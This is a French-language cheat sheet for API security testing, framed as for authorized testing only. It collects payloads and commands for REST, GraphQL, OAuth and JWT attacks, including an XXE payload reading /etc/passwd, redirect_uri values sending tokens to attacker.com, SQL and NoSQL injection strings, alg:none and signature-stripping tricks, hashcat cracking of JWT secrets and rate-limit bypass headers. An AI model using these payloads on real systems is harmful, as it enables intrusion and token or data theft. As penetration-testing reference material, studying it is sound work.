# 🔌 Fiche pratique de test de sécurité des API

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   █████╗ ██████╗ ██╗    ███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗
  ██╔══██╗██╔══██╗██║    ██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
  ███████║██████╔╝██║    ███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝ 
  ██╔══██║██╔═══╝ ██║    ╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝  
  ██║  ██║██║     ██║    ███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║   
  ╚═╝  ╚═╝╚═╝     ╚═╝    ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   
```

<p align="center">
  <img src="https://img.shields.io/badge/API-Security-blue?style=for-the-badge" alt="API">
  <img src="https://img.shields.io/badge/REST-Testing-green?style=for-the-badge" alt="REST">
  <img src="https://img.shields.io/badge/GraphQL-red?style=for-the-badge" alt="GraphQL">
</p>

---

> **Classement OWASP :** le tableau reprend l’ordre et les libellés abrégés de la source, qui décalent les positions 6 à 8. Dans la [liste officielle 2023](https://api-security.owasp.org/editions/2023/en/0x11-t10/), API6 concerne l’accès non limité aux flux métier sensibles, API7 correspond à SSRF et API8 aux mauvaises configurations. La consommation non limitée de ressources ne se réduit pas à l’absence de limitation du débit.
>
> **Lecture des JWT :** les jetons tronqués ne sont pas des entrées complètes. Un JWT signé utilise des segments Base64URL ; décoder un segment ne vérifie pas sa signature. Le libellé source « HS256 → RS256 » inverse le cas classique de confusion décrit dans la [RFC 8725](https://www.rfc-editor.org/rfc/rfc8725.html#section-2.1) : un jeton prévu pour RS256 est présenté comme HS256 à une implémentation vulnérable. Les valeurs et commandes sources sont conservées.
>
> **Extraits illustratifs :** la commande curl XXE ne précise pas de destination. L’extrait GraphQL de suggestion de champs possède une accolade non fermée ; ses suggestions dépendent aussi du serveur. Modifier une méthode, un champ ou un en-tête, supprimer une signature ou ajouter un attribut n’est pas à lui seul une preuve de contournement : le comportement et les contrôles côté serveur doivent être établis. Les exemples ne sont pas exécutés et le dessin ASCII reste celui de la source.

## 📋 Table des matières

- [OWASP API Top 10](#-owasp-api-top-10)
- [Tests des API REST](#-tests-des-api-rest)
- [Tests GraphQL](#-tests-graphql)
- [Attaques contre l’authentification](#-attaques-contre-lauthentification)
- [Attaques contre les JWT](#-attaques-contre-les-jwt)
- [Vulnérabilités courantes](#-vulnérabilités-courantes)

---

## 🔴 OWASP API Top 10

| # | Vulnérabilité | Description |
|---|---------------|-------------|
| 1 | **BOLA** | Défaut d’autorisation au niveau des objets |
| 2 | **Authentification défaillante** | Faiblesses de l’authentification |
| 3 | **BOPLA** | Défaut d’autorisation au niveau des propriétés d’objet |
| 4 | **Consommation de ressources non limitée** | Absence de limitation du débit |
| 5 | **BFLA** | Défaut d’autorisation au niveau des fonctions |
| 6 | **SSRF** | Falsification de requêtes côté serveur |
| 7 | **Mauvaise configuration de sécurité** | Configurations par défaut |
| 8 | **Protection insuffisante** | Flux métier |
| 9 | **Mauvaise gestion des actifs** | Anciennes API |
| 10 | **Consommation non sûre d’API** | API tierces |

---

## 🌐 Tests des API REST

### Découverte et énumération

```bash
# Rechercher les points de terminaison des API
ffuf -u https://api.target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Énumération des versions
/api/v1/users
/api/v2/users
/api/v3/users
/api/beta/users
/api/latest/users

# Chemins courants
/api/
/api/v1/
/api/v2/
/rest/
/graphql
/swagger/
/openapi.json
/api-docs
/swagger.json
/swagger-ui/
/docs/
```

### Test des méthodes HTTP

```bash
# Tester toutes les méthodes
curl -X GET https://api.target.com/users/1
curl -X POST https://api.target.com/users
curl -X PUT https://api.target.com/users/1
curl -X PATCH https://api.target.com/users/1
curl -X DELETE https://api.target.com/users/1
curl -X OPTIONS https://api.target.com/users

# Redéfinition de la méthode
curl -X POST -H "X-HTTP-Method-Override: DELETE" https://api.target.com/users/1
curl -X POST -H "X-Method-Override: PUT" https://api.target.com/users/1
```

### Manipulation des paramètres

```bash
# BOLA/IDOR
GET /api/users/1      # Votre identifiant
GET /api/users/2      # Identifiant d’un autre utilisateur
GET /api/users/0
GET /api/users/-1
GET /api/users/999999

# Pollution des paramètres
/api/users?id=1&id=2
/api/users?id[]=1&id[]=2

# Contournement par l’encodage
/api/users/1%00
/api/users/1%0a
/api/users/1%2e%2e%2f2
```

### Attaques liées à Content-Type

```bash
# Modifier Content-Type
Content-Type: application/json
Content-Type: application/xml
Content-Type: application/x-www-form-urlencoded
Content-Type: text/xml
Content-Type: text/plain

# XXE via Content-Type
curl -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user>&xxe;</user>'
```

### Affectation massive (mass assignment)

```bash
# Ajouter des champs supplémentaires
POST /api/users
{
  "username": "test",
  "email": "test@test.com",
  "role": "admin",           # Essayer d’ajouter ce champ
  "isAdmin": true,           # Essayer d’ajouter ce champ
  "balance": 99999,          # Essayer d’ajouter ce champ
  "verified": true           # Essayer d’ajouter ce champ
}

# Utilisation de tableaux
{
  "user": {
    "name": "test",
    "role_ids": [1, 2, 3]
  }
}
```

---

## 📊 Tests GraphQL

### Introspection

```graphql
# Requête complète d’introspection
query {
  __schema {
    types {
      name
      fields {
        name
        args { name }
      }
    }
  }
}

# Introspection simple
{__schema{types{name,fields{name}}}}

# Récupérer toutes les requêtes
{__schema{queryType{fields{name,description}}}}

# Récupérer toutes les mutations
{__schema{mutationType{fields{name,description}}}}
```

### Attaques courantes

```graphql
# IDOR
query { user(id: 2) { email, password } }

# Attaque par regroupement de requêtes
query {
  user1: user(id: 1) { email }
  user2: user(id: 2) { email }
  user3: user(id: 3) { email }
}

# Déni de service par requête imbriquée
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          name
        }
      }
    }
  }
}

# Suggestions de champs
{ user { a }  # Suggérera des champs valides selon la source
```

### Injection SQL dans GraphQL

```graphql
# Injection SQL dans les arguments
query { user(name: "' OR '1'='1") { id } }
query { users(filter: "admin'--") { id } }

# Injection NoSQL
query { user(query: "{$gt: ''}") { id } }
```

### Contournement de la désactivation de l’introspection

```graphql
# Autre forme d’introspection
query { __type(name: "User") { fields { name } } }

# Recherche de champs par force brute avec ffuf
# Utiliser une liste de noms de champs GraphQL courants
```

---

## 🔐 Attaques contre l’authentification

### Test des clés d’API

```bash
# Rechercher les clés d’API
# Examiner les fichiers JavaScript, les applications mobiles et GitHub

# Tester la clé à différents emplacements
curl -H "X-API-Key: KEY" https://api.target.com
curl -H "Authorization: Bearer KEY" https://api.target.com
curl -H "api-key: KEY" https://api.target.com
curl "https://api.target.com?api_key=KEY"
```

### Attaques OAuth/OAuth2

```bash
# Vol de jeton via redirect_uri
?redirect_uri=https://attacker.com
?redirect_uri=https://target.com.attacker.com
?redirect_uri=https://target.com%40attacker.com
?redirect_uri=https://target.com/callback/../../../attacker

# Contournement du paramètre state
# Supprimer le paramètre state
# Utiliser le même state pour différents utilisateurs

# Fuite de jeton
# Examiner l’en-tête Referer pour rechercher une fuite de jeton
```

### Gestion des sessions

```bash
# Énumération des jetons
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# Les anciens jetons restent-ils valides après déconnexion ?
# Problèmes de rotation des jetons
# Réutilisation de jetons entre sessions
```

---

## 🎫 Attaques contre les JWT

### Décoder un JWT

```bash
# En ligne : jwt.io
# CLI
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." | base64 -d
```

### Confusion d’algorithme

```bash
# Remplacer alg par none
{
  "alg": "none",
  "typ": "JWT"
}
# Supprimer la signature

# Attaque HS256 → RS256 (libellé source ; voir la précision)
# Utiliser la clé publique comme secret HMAC
```

### Contournement de la signature

```bash
# Supprimer la signature en conservant les points
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.

# Recherche d’un secret faible par force brute
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# Secrets faibles courants
secret
password
123456
your-256-bit-secret
```

### Manipulation des attributs (claims)

```javascript
// Modifier les attributs de l’utilisateur
{
  "sub": "1234567890",
  "name": "admin",        // Remplacer par admin
  "role": "admin",        // Élever le rôle
  "admin": true,          // Ajouter l’indicateur admin
  "exp": 9999999999       // Repousser l’expiration
}
```

### Outils JWT

```bash
# jwt_tool
python3 jwt_tool.py <JWT>
python3 jwt_tool.py <JWT> -T    # Modifier le jeton
python3 jwt_tool.py <JWT> -C -d wordlist.txt  # Rechercher le secret

# jwtcrack
./jwtcrack <JWT>
```

---

## 🐛 Vulnérabilités courantes

### Contournement de la limitation du débit

```bash
# En-têtes à essayer
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1

# Modifier la casse
X-FORWARDED-FOR: 127.0.0.1

# Octet nul
X-Forwarded-For: 127.0.0.1%00

# Différents points de terminaison
/api/login
/API/LOGIN
/api/Login
/api/login/
```

### BOLA : autorisation défaillante au niveau des objets

```bash
# Tester la manipulation de l’identifiant
GET /api/orders/123    # Votre commande
GET /api/orders/124    # Commande d’une autre personne

# Tentatives de prédiction des UUID
# Rechercher des motifs prévisibles
# Essayer des valeurs séquentielles ou fondées sur un horodatage

# Identifiant dans différents formats
/api/users/1
/api/users/001
/api/users/user_1
/api/users/0x1
```

### BFLA : autorisation défaillante au niveau des fonctions

```bash
# Accéder aux points d’administration avec un compte ordinaire
GET /api/admin/users
POST /api/admin/config
DELETE /api/admin/user/1

# Selon la méthode
GET /api/users     # Autorisé
POST /api/users    # Devrait être réservé aux administrateurs ?
DELETE /api/users  # Devrait être réservé aux administrateurs ?
```

### Mauvaise gestion des actifs

```bash
# Anciennes versions d’API
/api/v1/users    # Peut comporter davantage de vulnérabilités
/api/v2/users    # Version actuelle
/api/v3/users    # Version bêta ou non publiée

# Points de terminaison de développement
/api/debug/
/api/test/
/api/internal/
/api/dev/
```

---

## 🛠️ Outils

| Outil | Utilité |
|------|---------|
| **Burp Suite** | Interception et test des API |
| **Postman** | Exploration des API |
| **Insomnia** | Client REST/GraphQL |
| **graphql-voyager** | Visualisation GraphQL |
| **jwt_tool** | Test des JWT |
| **Arjun** | Découverte de paramètres |

---

## 📚 Ressources

- [OWASP API Security Top 10](https://owasp.org/API-Security/)
- [GraphQL Voyager](https://apis.guru/graphql-voyager/)
- [JWT.io](https://jwt.io/)

---

<p align="center">
  <b>🔌 Sécurisez vos API !</b><br>
  <i>Pour les tests autorisés uniquement !</i>
</p>
